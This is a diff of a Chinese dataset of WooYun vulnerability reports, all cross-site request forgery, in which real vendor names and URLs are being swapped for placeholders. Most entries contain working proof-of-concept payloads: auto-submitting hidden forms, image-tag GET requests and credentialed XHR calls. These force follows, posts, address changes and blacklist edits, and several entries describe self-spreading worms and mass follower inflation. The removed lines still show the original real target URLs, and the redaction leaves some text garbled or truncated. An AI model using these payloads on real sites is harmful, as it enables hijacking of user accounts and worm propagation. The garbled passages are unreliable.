+**详情**: 时光网微评功能设计缺陷导致跨站请求伪造(CSRF)#1poc：<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>get csrf</title></head><body><img src="https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -7099,9 +7099,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 菁优网某功能设计缺陷导致跨站请求伪造(CSRF)(附poc).接口：http://space.jyeoo.com/profile/updatepostpoc见下方。
+**详情**: 菁优网某功能设计缺陷导致跨站请求伪造(CSRF)(附poc).接口：https://example.com/[已脱敏]
 
-**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=GB2312"><title>CSRF POC</title></head><body><form action="http://space.jyeoo.com/profile/updatepost" method="post"><input type="hidden" name="a" value="CSRFTest"/><input type="hidden" name="b" value="1"/><input type="hidden" nam
+**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=GB2312"><title>CSRF POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="a" value="CSRFTest"/><input type="hidden" name="b" value="1"/><input type="hidden" nam
 
 **绕过**: 直接利用
 
@@ -7121,7 +7121,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.xiangguo.comPOC<html><body><form action="http://www.xiangguo.com/customer/address" method="POST"><input type="hidden" name="province" value="�#166;&#143;�#187;� /><input type="hidden" name="city" value="�#141;&#151;�#185;&#179;�#184;&#130;" /><input type="hidden" name="county" value="娴&#166;�#159;&#142;�#142;&#191;" /><input type="hidden" name="address" value="�#149;&#138;�#174;&#158;�#
+**详情**: https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="province" value="�#166;&#143;�#187;� /><input type="hidden" name="city" value="�#141;&#151;�#185;&#179;�#184;&#130;" /><input type="hidden" name="county" value="娴&#166;�#159;&#142;�#142;&#191;" /><input type="hidden" name="address" value="�#149;&#138;�#174;&#158;�#
 
 **POC**: (见原文)
 
@@ -7143,7 +7143,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先说一下这只是做一个简单的测试,这个确实是可以CSRF蠕虫的出问题站点就是你们的总站啦!!站点对CSRF不设防,我来说个例子:这是加关注的接口http://www.jingwei.com/follow/followuser?uid=我在这里找一个关注的人抓包GET请求,uid参数是所要关注的对象uid,我的uid为7594985,那么经纬网的用户吩咐要访问了下面的链接即可关注了本人..http://www.jingwei.com/follow/followuser?uid=7594985这里我的利用方式是:用一点社会工程诱用户点击上述的链接,当然经纬网已经给了我这一个平台,我就用经纬网的发布信息的地方发上我的链接,当然要写出一点好的内容啦,因为我这里是测试就直接发链接啦!!发布好之后现在我登录我的另一个号来测试我来点击刚才我发的链接地址
+**详情**: 首先说一下这只是做一个简单的测试,这个确实是可以CSRF蠕虫的出问题站点就是你们的总站啦!!站点对CSRF不设防,我来说个例子:这是加关注的接口https://example.com/[已脱敏]
 
 **POC**: OK成功关注
 
@@ -7187,9 +7187,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 有点鸡肋，因为参数里有一个uid，用来针对性让某人强制订阅你效果还是不错的.http://www.tudou.com/uis/sub/sub.action?jsoncallback=test&subId=765758835&type=2&app=watch&deviceID=1&url=&from=15&uid=769734551
+**详情**: 有点鸡肋，因为参数里有一个uid，用来针对性让某人强制订阅你效果还是不错的.https://example.com/[已脱敏]
 
-**POC**: 想批量刷粉丝也行，只需循环大量请求即可批量爬取用户ID然后填写进去POC：<img src="http://www.tudou.com/uis/sub/sub.action?jsoncallback=test&subId=765758835&type=2&app=watch&deviceID=1&url=&from=15&uid=769734551"><img src="http://www.tudou.com/uis/sub/sub.action?jsoncallback=test&subId=765758835&type=2&app=watch&deviceID=1&url=&from=1
+**POC**: 想批量刷粉丝也行，只需循环大量请求即可批量爬取用户ID然后填写进去POC：<img src="https://example.com/[已脱敏]"><img src="https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7209,7 +7209,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: CSRF删帖，利用十分简单。zone删（回）帖的函数：function DelComment(commentId){if(confirm("确定删除此内容?")){$.get('/index.php?do=edit&act=delcomment',{"fun":"ajax","id":commentId,"r":Math.random()},function(re){$("#commentLi_"+commentId).remove();});}}特征：GET请求，没有Token，也没有验证Referer（验不验证referer不重要，后面有说到）。目标URL：http://zone.wooyun.org/index.php?do=edit&act=delcomment&fun=ajax&id=311946311946即为需要删除的帖子id：（PS：这个id是可以遍历的，也就是我构造一个页
+**详情**: CSRF删帖，利用十分简单。zone删（回）帖的函数：function DelComment(commentId){if(confirm("确定删除此内容?")){$.get('/index.php?do=edit&act=delcomment',{"fun":"ajax","id":commentId,"r":Math.random()},function(re){$("#commentLi_"+commentId).remove();});}}特征：GET请求，没有Token，也没有验证Referer（验不验证referer不重要，后面有说到）。目标URL：https://example.com/[已脱敏]
 
 **POC**: 见上面。
 
@@ -7219,8 +7219,8 @@
 ---
 
 ---
-### [wooyun-2012-05032] 新浪微博可导致大面积病毒传播漏洞
-**厂商**: 新浪 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-05032] 某社交平台某社交平台可导致大面积病毒传播漏洞
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -7231,9 +7231,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 微数据 发微博缺少来源验证
+**详情**: 微数据 发某社交平台缺少来源验证
 
-**POC**: 看看这个微博 http://weibo.com/1829851507/y8ohe17Ct 可试下威力,记得试过了赶快删除微博,以免传播开...<form action="http://data.weibo.com/mydata/ajax/post" method="post"  id="f2" target="ifr2"><input name="text" id="updatemsg" value=""><input name="picid" value="6d115173jw1dqo6buv5r0j"><input name="pic" value="http://ww1.sinaimg.
+**POC**: 看看这个某社交平台 https://example.com/[已脱敏] 可试下威力,记得试过了赶快删除某社交平台,以免传播开...<form action="https://example.com/[已脱敏]" method="post"  id="f2" target="ifr2"><input name="text" id="updatemsg" value=""><input name="picid" value="6d115173jw1dqo6buv5r0j"><input name="pic" value="https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7253,9 +7253,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.中兴通讯政企网：http://enterprise.zte.com.cn，提交重要信息变更（如个人账户信息修改）时缺少校验，存在CSRF漏洞。2.拿“修改个人信息”作为举例：拦截修改时的HTTP消息：里面涉及到的参数CommandName，email，phone ，name，gender，cartNo都是命令或者我们要修改的信息，没有用于csrf的随机token，然后再尝试修改不同的referer看是否采取了referer校验，结果表明不管referer是其他或者为空都能够成功修改信息。
+**详情**: 1.中兴通讯政企网：https://example.com/[已脱敏] ，name，gender，cartNo都是命令或者我们要修改的信息，没有用于csrf的随机token，然后再尝试修改不同的referer看是否采取了referer校验，结果表明不管referer是其他或者为空都能够成功修改信息。
 
-**POC**: 1.构造一个修改个人信息的GET型CSRF POC：<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head><meta http-equiv="Content-Type" content="text/html;charset=UTF-8"><title>test</title></hea
+**POC**: 1.构造一个修改个人信息的GET型CSRF POC：<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://example.com/[已脱敏]"><html xmlns="https://example.com/[已脱敏]" xml:lang="en"><head><meta http-equiv="Content-Type" content="text/html;charset=UTF-8"><title>test</title></hea
 
 **绕过**: 直接利用
 
@@ -7275,7 +7275,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 个人日志发帖，图片和视频插入处可以用">截断连接，从而插入embed标签。如图片链接http://"><embed/src=//tmxk.org>，也可以直接f12(chrome)在控制台编辑插入，效果如，http://bbs.suning.com/dz15/home.php?mod=space&uid=1177871&do=blog&id=7279
+**详情**: 个人日志发帖，图片和视频插入处可以用">截断连接，从而插入embed标签。如图片链接http://"><embed/src=//tmxk.org>，也可以直接f12(chrome)在控制台编辑插入，效果如，https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -7319,7 +7319,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 于是我给我的糗友发了一个链接，http://www.qiushibaike.com/users/14288550/follow他纯洁的点了一下下。默默的我就多了一个粉丝。。另外我登自己的账号，也访问了一下关注自己的链接，居然自己成了自己的粉丝,，但是粉丝数量还是显示0。在我朋友被我骗了关注以后，查看自己的粉丝发现数量变为了1，右边显示的粉丝ID也是自己的，朋友的ID没有被显示出来。
+**详情**: 于是我给我的糗友发了一个链接，https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -7351,8 +7351,8 @@
 ---
 
 ---
-### [wooyun-2012-015885] 中国联通手机邮箱csrf漏洞
-**厂商**: 中国联通 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-015885] 某运营商手机邮箱csrf漏洞
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -7363,7 +7363,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、邮箱服务器 http://mail.wo.com.cn 个人测试的为186号段的邮箱。2、给自己发送了一封邮件，当然这里编辑器里没有直接编辑html代码的功能（不知道为什么现在很多邮箱都没了，为了安全？呵呵），直接抓包修改下img标签的src属性，改成我们的攻击表单地址，发送2、返回收件箱里查看，可以看到请求了，但是没有发送邮件，主要是因为这里的img标签请求得到的数据并没有执行。3、那我们只能利用外链的方式来发起攻击，这样利用场景就很多了，可以给受害者发送一封带外链的邮件，或者诱骗受害者访问你的邮件，攻击效果可能就不是那么完美了，但是危害依然存在。4、访问外链后，可以看到给自己发送了一封邮件，删除邮件也是可以的。
+**详情**: 1、邮箱服务器 https://example.com/[已脱敏] 个人测试的为186号段的邮箱。2、给自己发送了一封邮件，当然这里编辑器里没有直接编辑html代码的功能（不知道为什么现在很多邮箱都没了，为了安全？呵呵），直接抓包修改下img标签的src属性，改成我们的攻击表单地址，发送2、返回收件箱里查看，可以看到请求了，但是没有发送邮件，主要是因为这里的img标签请求得到的数据并没有执行。3、那我们只能利用外链的方式来发起攻击，这样利用场景就很多了，可以给受害者发送一封带外链的邮件，或者诱骗受害者访问你的邮件，攻击效果可能就不是那么完美了，但是危害依然存在。4、访问外链后，可以看到给自己发送了一封邮件，删除邮件也是可以的。
 
 **POC**: 具体其他的攻击细节没有贴图，可自行验证！
 
@@ -7385,9 +7385,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先是修改签名的接口地址：http://www.acfun.tv/member/signSubmit.aspxPOST数据：sign=签名内容然后是私信地址：http://www.acfun.tv/api/mail.aspx?name=newMailPOST数据：username=昵称&content=私信内容然后是听众接口：http://www.acfun.tv/api/friend.aspx?name=getFollowedList&pageNo=1&pageSize=10JSON格式，可直接解析使用最后是个人资料接口：http://www.acfun.tv/member/profile.aspx怎样来做一个非常的完美蠕虫呢？做一个蠕虫页面，功能如下：先得到自己名字（其实也可以不用获取自己资料），获取自己的全部听众，然后循环给所有听众发私信（通过IFRAME的方式自动POST可保证页面
+**详情**: 首先是修改签名的接口地址：https://example.com/[已脱敏]
 
-**POC**: ACFUN登录状态下访问 http://chat.1dos.com点击next，你的签名就会被修改。其它问题影响太大，不做验证，但推断绝对可行。
+**POC**: ACFUN登录状态下访问 https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7395,7 +7395,7 @@
 ---
 
 ---
-### [wooyun-2013-027098] 搜狐微博某高危GET型csrf可引发蠕虫！！！
+### [wooyun-2013-027098] 搜狐某社交平台某高危GET型csrf可引发蠕虫！！！
 **厂商**: 搜狐 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 上传功能
@@ -7407,7 +7407,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞存在于微活动转发处，本来是一个POST请求的，但是GET方式也可，所以危害瞬间提高了一个等级啊。http://t.sohu.com/gy/twitter/support?msg=csrf%20by%20vip&wgyId=5313另外，本来发图片处是只能上传图片的，但是，可以通过抓包修改，加载上面的地址，看到微博即会自动蠕动。首先，上传一张任意图片。然后，Fiddler抓包，把地址改成上面的。成功了有木有！！！这样就一传十十传百了啊有木有！！！PS：为了防止造成危害，相关测试微博已删除。
+**详情**: 漏洞存在于微活动转发处，本来是一个POST请求的，但是GET方式也可，所以危害瞬间提高了一个等级啊。https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -7429,7 +7429,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 网站主站多处存在csrf，此处以修改收货地址处进行说明。修改收货地址，抓包拦截：可以看到消息体中无不可预测参数，故伪造csrf链接，主要代码：xmlhttp.open("POST", "http://www.mia.com/instant/order/homeSaveAddress", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("addressid=1421166&type=edit&truename=11111&prov=1&city=456&area=4443&town=42998&address=ffffff&mobile=13000000000&phone=");访问该链接
+**详情**: 网站主站多处存在csrf，此处以修改收货地址处进行说明。修改收货地址，抓包拦截：可以看到消息体中无不可预测参数，故伪造csrf链接，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("addressid=1421166&type=edit&truename=11111&prov=1&city=456&area=4443&town=42998&address=ffffff&mobile=13000000000&phone=");访问该链接
 
 **POC**: 同上
 
@@ -7451,9 +7451,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.m6go.com/my/myAddressList.do问题在收货地址添加一个收货地址看看构造表单试试
+**详情**: https://example.com/[已脱敏]
 
-**POC**: <form method="POST" name="form0" action="http://www.m6go.com:80/my/doEditAddress.do"><input type="hidden" name="MAddressInfo.AddressId" value=""/><input type="hidden" name="MAddressInfo.UserId" value=""/><input type="hidden" name="MAddressInfo.TrueName" value="dfsadf"/><input type="hidden" name="pro
+**POC**: <form method="POST" name="form0" action="https://example.com/[已脱敏]"><input type="hidden" name="MAddressInfo.AddressId" value=""/><input type="hidden" name="MAddressInfo.UserId" value=""/><input type="hidden" name="MAddressInfo.TrueName" value="dfsadf"/><input type="hidden" name="pro
 
 **绕过**: 直接利用
 
@@ -7495,7 +7495,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: a.首先来看标题所说的，就是“加入黑名单”这个操作存在CSRF漏洞。登录用户访问 http://www.renren.com/Block.do?id=xxxxxx 以后，就会将id为xxxxxx的用户加入黑名单。加入黑名单的效果就是如果原本是好友则解除好友，然后会收不到这个用户的加好友请求。站内信好像也会收不到~b.批量触发CSRF的功能就是人人的“分享”了。当分享一个网址时，人人会尝试解析网址，提取标题和内容以及图片。其中的图片最后直接输出到好友的信息流里，于是这个图片就可以拿来批量触发了。对于一个好友数为1000的人人用户来说，触发效果不一般~ 以及如果这个分享很吸引眼球且有时效性，被不少人分享的话，效果会进一步增强。另外，也可以用来触发其他的任务……比如可以利用人人好友来批量刷票（GET）、批量刷访问量等等…… 很久以前还可以用来批量抓iOS人人客户端的token..////////
+**详情**: a.首先来看标题所说的，就是“加入黑名单”这个操作存在CSRF漏洞。登录用户访问 https://example.com/[已脱敏] 以后，就会将id为xxxxxx的用户加入黑名单。加入黑名单的效果就是如果原本是好友则解除好友，然后会收不到这个用户的加好友请求。站内信好像也会收不到~b.批量触发CSRF的功能就是人人的“分享”了。当分享一个网址时，人人会尝试解析网址，提取标题和内容以及图片。其中的图片最后直接输出到好友的信息流里，于是这个图片就可以拿来批量触发了。对于一个好友数为1000的人人用户来说，触发效果不一般~ 以及如果这个分享很吸引眼球且有时效性，被不少人分享的话，效果会进一步增强。另外，也可以用来触发其他的任务……比如可以利用人人好友来批量刷票（GET）、批量刷访问量等等…… 很久以前还可以用来批量抓iOS人人客户端的token..////////
 
 **POC**: a. 加黑名单..访问下地址就可以拉黑了，不贴过程了……b. 测试B的时候我就不用拉黑了吧。。给自己刷刷来访吧。。1) 构造一个如下的页面页面里有个隐藏的img（防止小伙伴们发现问题=w=分享完以后改成301跳转那就效果更好了~2) 分享一下3) 于是回到新鲜事。。浏览器请求了这张“图片”（我对图片执行了一下301跳转~ 浏览器实际上会访问我的主页）（注：人人的分享图片有个onerror则销毁自身DOM #*&(#&*$，所以看DOM是看不到图片的。。）话说发现人人的好友/自己的Profile底部今天出现了这些东西，这是什么情况？
 
@@ -7505,8 +7505,8 @@
 ---
 
 ---
-### [wooyun-2013-019051] 新浪微博手机版两处csrf漏洞，可强制发微博，加关注话题
-**厂商**: 新浪 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-019051] 某社交平台某社交平台手机版两处csrf漏洞，可强制发某社交平台，加关注话题
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -7517,18 +7517,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 点击链接http://weibo.cn/trend/follow?k=此处插入任意文本&rl=1&vt=1会自动关注一个话题点击链接http://weibo.cn/trend/follow?act=recommendc&k=此处插入文本&rl=1&vt=1会自动发布一条推荐微博
+**详情**: 点击链接https://example.com/[已脱敏]
 
-**POC**: 点击链接http://weibo.cn/trend/follow?k=此处插入任意文本&rl=1&vt=1会自动关注一个话题点击链接http://weibo.cn/trend/follow?act=recommendc&k=此处插入文本&rl=1&vt=1会自动发布一条推荐微博
+**POC**: 点击链接https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 1-先关注新浪微博@1OO0O2-然后这两个功能的链接里面添加st=****的验证第一步可以跳过哈哈哈哈
+**修复**: 1-先关注某社交平台某社交平台@1OO0O2-然后这两个功能的链接里面添加st=****的验证第一步可以跳过哈哈哈哈
 ---
 
 ---
-### [wooyun-2013-025820] 再说腾讯微博csrf刷粉丝
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-025820] 再说某互联网公司某社交平台csrf刷粉丝
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -7539,7 +7539,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1）看新闻的时候，晃眼看见的，城市频道上应该都有，收听一个人直接GET请求；http://city.cd.qq.com/app/?type=1001&mod=api&act=friendsAdd&of=js&name=2）上个小号测试下，有阴影呀，本身未收听任何人；3）使用se55i0n帐号发布以下微博（测试完毕后，已经立即删除）；4）使用小号先收听se55i0n的微博，然后点击刚刚发布的微博，效果如下；5）返回页面刷新下，成功收听wooyun官方；
+**详情**: 1）看新闻的时候，晃眼看见的，城市频道上应该都有，收听一个人直接GET请求；https://example.com/[已脱敏]
 
 **POC**: 见详细说明
 
@@ -7549,7 +7549,7 @@
 ---
 
 ---
-### [wooyun-2014-054896] 太平洋汽车网-QQ OAuth 2.0 redirect_uir CSRF 漏洞
+### [wooyun-2014-054896] 太平洋汽车网-某互联网公司 OAuth 2.0 redirect_uir CSRF 漏洞
 **厂商**: 太平洋汽车网 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
@@ -7561,7 +7561,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 太平洋汽车网-QQ OAuth 2.0 认证流程中https://graph.qq.com/oauth2.0/authorize?response_type=code&scope=get_user_info,get_simple_userinfo,add_topic,upload_pic,add_share&redirect_uri=http%3A%2F%2Fpassport2.pcauto.com.cn%2Fpassport2%2Fapi%2Fopen_oauth.jsp&state=loginBind%3Dhttp%3A%2F%2Fmy.pcauto.com.cn%2Fpassport%2Fopens%2Fbind_done.jsp%26type%3Dqzone_auto%26return%3Dhttp%3A%2F%2Fmy.pcauto.com.cn%2Fsetting%2Fshar
+**详情**: 太平洋汽车网-某互联网公司 OAuth 2.0 认证流程中https://example.com/[已脱敏]
 
 **POC**: 如果登录了太平洋汽车的用户误点了这个request. 太平洋汽车会将用户redirect到主页。然后我们进绑定中心可以发现，绑定成功
 
@@ -7583,9 +7583,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://f.lefeng.com/问题出现在关注这里这个uid就是需要关注的id
+**详情**: https://example.com/[已脱敏]
 
-**POC**: POST /weibo/follow?&u=t&lg=n&uid=49679472 HTTP/1.1Host: f.lefeng.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestReferer: http://f.lefen
+**POC**: POST /weibo/follow?&u=t&lg=n&uid=49679472 HTTP/1.1Host: f.lefeng.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestReferer: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7605,9 +7605,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.pclady.com.cn/网站多处存在csrf，下面以修改详细资料处为例：修改资料，抓包查看资料，正常修改成功：从上面请求包中可看出，请求包中无不可预测参数，故可伪造链接，实现csrf。伪造链接，主要代码如下：xmlhttp.open("POST", "http://my.pclady.com.cn/users/updateAccount.do", true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send("borthday=2015-07-10&skin=0&weight=55.0&height=170.0&blog=99999999999999999&weibo=
+**详情**: https://example.com/[已脱敏]"POST", "https://example.com/[已脱敏]", true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send("borthday=2015-07-10&skin=0&weight=55.0&height=170.0&blog=99999999999999999&weibo=
 
-**POC**: poc####伪造链接，主要代码如下：xmlhttp.open("POST", "http://my.pclady.com.cn/users/updateAccount.do", true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send("borthday=2015-07-10&skin=0&weight=55.0&height=170.0&blog=99999999999999999&weib
+**POC**: poc####伪造链接，主要代码如下：xmlhttp.open("POST", "https://example.com/[已脱敏]", true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send("borthday=2015-07-10&skin=0&weight=55.0&height=170.0&blog=99999999999999999&weib
 
 **绕过**: 直接利用
 
@@ -7629,7 +7629,7 @@
 
 **详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。
 
-**POC**: 漏洞地址：http://t.sohu.com/event/insertTw<html><body><form id="imlonghao" name="imlonghao" action="http://t.sohu.com/event/insertTw" method="post"><input type="text" name="msg" value="XXXXXXXXXXXXXX" /><input type="submit" value="submit" /></form><script>document.imlonghao.submit();</script></body></htm
+**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="msg" value="XXXXXXXXXXXXXX" /><input type="submit" value="submit" /></form><script>document.imlonghao.submit();</script></body></htm
 
 **绕过**: 直接利用
 
@@ -7637,8 +7637,8 @@
 ---
 
 ---
-### [wooyun-2013-042571] 双十一淘宝论坛惊现“路由器CSRF”恶意攻击代码（其他论坛可能一样中招）
-**厂商**: 淘宝网 | **年份**: 2013 | **类型**: 钓鱼欺诈信息
+### [wooyun-2013-042571] 双十一某电商平台论坛惊现“路由器CSRF”恶意攻击代码（其他论坛可能一样中招）
+**厂商**: 某电商平台网 | **年份**: 2013 | **类型**: 钓鱼欺诈信息
 
 **元思考**: 触发信号: 功能测试
 
@@ -7649,13 +7649,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先地址是这个：http://bbs.taobao.com/catalog/thread/508895-264831340.htm是淘宝没错吧，打开后发现了个401基础认证的密码输入框。分析网页源码，果然又看到了传说中的“路由CSRF”攻击代码往上追一追，来自一张极小的图片，这个图片直接给用户返回302跳转在看下这人帖子中这张诡异的“图片”
+**详情**: 首先地址是这个：https://example.com/[已脱敏]
 
-**POC**: 关键页面代码存个档<div class='ke-post'><p>学习学习!</p><p><img height="0" src="http://a.tbcdn.cn/sys/wangwang/smiley/48x48/12.gif" style="height: 0.0px;width: 0.0px;float: none;margin: 0.0px;" width="0"/></p><p><img height="0" src="http://img07.taobaocdn.co/tps/i7/T1aoxtXhtCXXXXXXXX-170-120.jpg" style="height: 0
+**POC**: 关键页面代码存个档<div class='ke-post'><p>学习学习!</p><p><img height="0" src="https://example.com/[已脱敏]" style="height: 0.0px;width: 0.0px;float: none;margin: 0.0px;" width="0"/></p><p><img height="0" src="https://example.com/[已脱敏]" style="height: 0
 
 **绕过**: 直接利用
 
-**修复**: 淘宝管管不？
+**修复**: 某电商平台管管不？
 ---
 
 ---
@@ -7671,9 +7671,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.xiangshe.com/my/Address.do收货地址处添加地址看了一下表单，有CSRF。构造表单提交一下看看。
+**详情**: https://example.com/[已脱敏]
 
-**POC**: <form method="POST" name="form0" action="http://www.xiangshe.com:80/my/doEditaddress.do"><input type="hidden" name="MAddressInfo.AddressId" value=""/><input type="hidden" name="MAddressInfo.UserId" value=""/><input type="hidden" name="MAddressInfo.TrueName" value="sadfsdf"/><input type="hidden" name
+**POC**: <form method="POST" name="form0" action="https://example.com/[已脱敏]"><input type="hidden" name="MAddressInfo.AddressId" value=""/><input type="hidden" name="MAddressInfo.UserId" value=""/><input type="hidden" name="MAddressInfo.TrueName" value="sadfsdf"/><input type="hidden" name
 
 **绕过**: 直接利用
 
@@ -7695,7 +7695,7 @@
 
 **详情**: Cross-siterequestforgery 漏洞，劫持用户黑名单操作，任意操作增删黑名单。漏洞证明将实现如何利用这个漏洞。
 
-**POC**: 经过抓包，我发现一条有趣的GET请求http://www.tianya.cn/api/tw?method=userBlack.ice.add&params.blackUserName=csrf&_r=其中params.blackUserName参数，表示用户名，这个请求的作用是添加params.blackUserName中的用户名进入黑名单。下面我给一种利用的方法：1.在博客里发布文章首先我们要利用img标签的src属性来达到GET请求的目的(关键)所以我们在文章编辑里点击插入图片(这里吐槽一下，天涯的博客程序居然是ASP的)我们先直接插入http://www.tianya.cn/api/tw
+**POC**: 经过抓包，我发现一条有趣的GET请求https://example.com/[已脱敏])所以我们在文章编辑里点击插入图片(这里吐槽一下，天涯的博客程序居然是ASP的)我们先直接插入https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7703,8 +7703,8 @@
 ---
 
 ---
-### [wooyun-2013-017636] 新浪SAE普通开发者认证CSRF
-**厂商**: 新浪 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-017636] 某社交平台SAE普通开发者认证CSRF
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
 
@@ -7715,7 +7715,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.在邀请链接后面加上&makesure=1，然后到新浪开发者论坛回复插入下面的代码，别人在登陆了SAE的情况下打开有该代码的帖子会自动邀请指定用户。[img=1,1]http://sae.sina.com.cn/?m=home&a=devlevel&level=normal_level&voteme=XXXXX&makesure=1[/img]2.插入http://sae.sina.com.cn/?m=home&a=normal_developer_recommended_floatbox&email=xxxxxxx@qq.com这里直接点推荐用户是需要安全密码的，打开上面链接可以绕过密码验证。
+**详情**: 1.在邀请链接后面加上&makesure=1，然后到某社交平台开发者论坛回复插入下面的代码，别人在登陆了SAE的情况下打开有该代码的帖子会自动邀请指定用户。[img=1,1]https://example.com/[已脱敏]]2.插入https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -7737,9 +7737,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.lppz.comtoken没起到作用POC<html><body><form action="http://www.lppz.com/member/profile/update.jhtml" method="POST"><input type="hidden" name="memberAttribute&#95;1" value="�#152;&#191;�#144;&#168;�#190;&#190;" /><input type="hidden" name="memberAttribute&#95;2" value="male" /><input type="hidden" name="memberAttribute&#95;3" value="2015&#45;07&#45;09" /><input type="hidden" name="memberAttri
+**详情**: https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="memberAttribute&#95;1" value="�#152;&#191;�#144;&#168;�#190;&#190;" /><input type="hidden" name="memberAttribute&#95;2" value="male" /><input type="hidden" name="memberAttribute&#95;3" value="2015&#45;07&#45;09" /><input type="hidden" name="memberAttri
 
-**POC**: http://www.lppz.comtoken没起到作用POC<html><body><form action="http://www.lppz.com/member/profile/update.jhtml" method="POST"><input type="hidden" name="memberAttribute&#95;1" value="�#152;&#191;�#144;&#168;�#190;&#190;" /><input type="hidden" name="memberAttribute&#95;2" value="male" /><input type="hidd
+**POC**: https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="memberAttribute&#95;1" value="�#152;&#191;�#144;&#168;�#190;&#190;" /><input type="hidden" name="memberAttribute&#95;2" value="male" /><input type="hidd
 
 **绕过**: 直接利用
 
@@ -7761,15 +7761,15 @@
 
